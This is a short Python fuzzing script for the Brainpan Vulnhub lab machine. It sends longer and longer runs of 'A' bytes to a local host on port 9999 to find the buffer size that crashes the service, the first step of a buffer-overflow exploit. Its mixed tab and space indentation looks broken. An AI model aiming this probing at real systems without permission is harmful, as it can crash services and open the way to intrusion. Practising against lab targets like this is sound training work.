#!/usr/bin/python3
# Fuzzer by x41 - v1.0 - Brainpan (Vulnhub)
import socket
import time

host = "192.168.1.14"
port = 9999
counter = 1000

while (counter < 10000):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)
        print(data)

	s.send(b'A' * counter + b'\r\n')
        data = s.recv(1024)
        print(data)

	s.close()
        time.sleep(2)
        counter += 100
        print("[+] Buffersize {}".format(counter))
